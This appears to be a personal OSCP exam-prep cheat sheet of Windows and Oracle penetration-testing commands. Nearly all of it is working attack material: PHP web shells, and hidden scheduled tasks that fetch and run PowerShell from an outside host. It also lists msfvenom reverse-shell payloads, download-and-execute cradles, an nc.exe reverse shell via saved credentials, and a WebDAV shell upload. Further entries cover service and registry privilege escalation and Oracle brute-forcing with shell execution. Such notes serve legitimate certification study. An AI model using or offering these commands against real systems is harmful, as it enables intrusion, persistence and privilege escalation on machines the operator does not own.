# OSCP_Prep

## Simple php cmd shell
	<?php echo system($_GET["cmd"]); ?>
	<?php echo shell_exec($_GET["cmd"]); ?>

## Powershell in 32 and 64 bit windows PATH
	x64
		C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
	x32
		c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe	
	
## Scheduled tasks windows
	(X64) - On System Start
		schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System
 
	(X64) - On User Idle (30mins)
		schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
 
	(X86) - On User Login
		schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System
  
	(X86) - On System Start
		schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System
  
	(X86) - On User Idle (30mins)
		schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30


## MSFVENOM generate shell
	aspx reverse shell 
		msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx
	
	jsp reverse shell 
		msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=1337 -f raw > shell.jsp
	exe reverce shell
		msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe

## Run cmd from cmdshell:
	cmd /c
	cmd /k

## RPC discover
	rpcclient -U "" -N 10.10.10.11s 


## Powershell download a file
	powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 

## Powershell via CMD
	cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/shell.ps1')

## Powershell download an execute file
	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"


## Certutils file download
	certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

## Jucypotato
	https://github.com/ohpe/juicy-potato/releases
		Usage:
			1. Deploy reverse shell:
					shell_1338.ps1
			2. Create `shell.bat` file with next content:
				powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/shell_1338.ps1')
			3. Start listener on 1338 and run jucypotato:
 				.\JuicyPotato.exe -t * -p shell.bat -l 1338



## Powershell execution restricted
	echo $storageDir = $pwd > wget.ps1
	echo $webclient = New-Object System.Net.WebClient >>wget.ps1
	echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
	echo $file = "output-file.exe" >>wget.ps1
	echo $webclient.DownloadFile($url,$file) >>wget.ps1
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	OR
	powershell.exe -nop -ep bypass -c wget.ps1


## check privileges
	whoami /priv
	
	if SeImpersonatePrivilege privilege enabled.
		use method called Token HIjacking
			https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
			

## check for saved credentials 
	cmdkey /list

	runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
 
## Transfer file with SMB 
	sudo impacket-smbserver ROPNOP /sherad/folder

    Check share on target host:
	net view \\shareIP
	ls \\shareIP\ROPNOP


## IIS WebDav exploatation
	Use "cadaver" to check PUT method and directory listing
	Use "davtest" to check writable extentions
 	
	Use PUT method to save cmdaspx.aspx file content as txt file
	USE COPY method to copy cmdaspx.txt to cmdaspx.aspx
	
	```
	COPY /cmdaspx.txt HTTP/1.1
	Host: 10.10.10.15
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: close
	Destination:  http://10.10.10.15/cmdaspx.aspx
	```

	
# Windows privesc

# Check events
	cd events
	
## Stored Credentials
	1. Search the registry for usernames and passwords.
	2. If cmdkey /list returns entries, it means that you may able to runas certain user who stored his credentials in windows.
		runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
	
## Windows kernel exploatation
	 https://github.com/SecWiki/windows-kernel-exploits


## DLL Hijacking 

	Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in a specific order.

	1. The directory from which the application loaded
	2. 32-bit System directory (C:\Windows\System32)
	3. 16-bit System directory (C:\Windows\System)
	4. Windows directory (C:\Windows)
	5. The current working directory (CWD)
	6. Directories in the PATH environment variable (first system and then user)

## Unquoted Service Paths
	When a service is started Windows will search for the binary to execute. The location of the binary to be executed is declared in the binPath attribute. 
	If the path to the binary is unquoted, Windows does not know where the binary is located and will search in all folders, from the beginning of the path.

	So, if we want to exploit this misconfiguration, three conditions have to be met:

    		1.The service path is unquoted;
    		2.The service path contains space; and
    		3.We have write permission in one of the intermediate folders.

	If the binPath is set to
		C:\Program Files\Unquoted Path Service\Common Files\service.exe
	
	Windows will search in this order:

    		C:\Program.exe
    		C:\Program Files\Unquoted.exe
    		C:\Program Files\Unquoted Path.exe
    		C:\Program Files\Unquoted Path Service\Common.exe
    		C:\Program Files\Unquoted Path Service\Common Files\service.exe
	

	Create a payload with msfvenom and name it control.exe. Place it in the C:\Program Files\Unquoted Path Service\common.exe directory.


	Execute the payload by starting the service using: 
		sc start unquotedsvc

## Weak Folder Permissions
	If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.
	
	Replacing the file by copying the payload to the service binary location. Restart the service to execute the payload with higher privilege.
		

	copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
	sc start filepermsvc

## Weak Service Permissions

	Services created by SYSTEM having weak permissions can lead to privilege escalation.
	If a low privileged user can modify the service configuration, i.e. change the binPath to a malicious binary and restart the service then, the malicious binary will be executed with SYSTEM privileges.
	
	If the group “Authenticated users” has SERVICE_ALL_ACCESS in a service, then it can modify the binary that is being executed by the service.

	Modify the config using and start the service to execute the payload.

		sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"
	
	Listing the running service 
		wmic service get name,displayname,pathname,startmode
	
	Listing service that are autostarted
		wmic service get name,displayname,pathname,startmode|findstr /i "auto"
	
	Listing non standart service that are autostarted
		wmic service get name,displayname,pathname,startmode|findstr /i "auto" | findstr /i /v "c:\windows"

## Weak Registry Permission
	In Windows, services have a registry keys and those keys are located at: 
		HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
	If Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.

	Modify the ImagePath key of the registry to your payload path and restart the service.

		reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f
		sc start regsvc
		

## Always Install Elevated
	
	Windows can allow low privilege users to install a Microsoft Windows Installer Package (MSI) with system privileges by the AlwaysInstallElevated group policy.
		
	Generate a msfvenom payload in msiformat.
	Install the payload using
		msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
	
## Modifiable Autorun
	As the path to the autorun can be modified, we replace the file with our payload. To execute it with elevated privileges we need to wait for someone in the Admin group to login.
	

## Tater / Hot Potato !!!!!!!!!!!!!
	“Hot Potato (aka: Potato) takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.”
		powershell -exec Bypass -c ". .\Tater.ps1;Invoke-Tater -Trigger 1 -Command 'net localgroup administrators backdoor /delete';"
	
## Token Manipulation
	You can use the following exploits to escalate privileges.
		1. Rotten Potato
   		2. Juicy Potato



# ORACLE exploatetion
	Tool for exploatation
		https://github.com/quentinhardy/odat.git
	Check databese name:
		python3 odat.py sidguesser -s 10.10.10.82 -p 1521 
	Use password list from metasploit:
		/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.tx
		Replace delimeter ' ' to '/'
	Brute force login and passwords:
		python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file credential_oracle.txt

	Generate exe reverse shell and use odat to upload it:
		python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe shell.exe 
		
		If error insufficient privileges:
		
		python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe shell.exe --sysdba
	
	Execute shell with odat:
		python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba

	
	
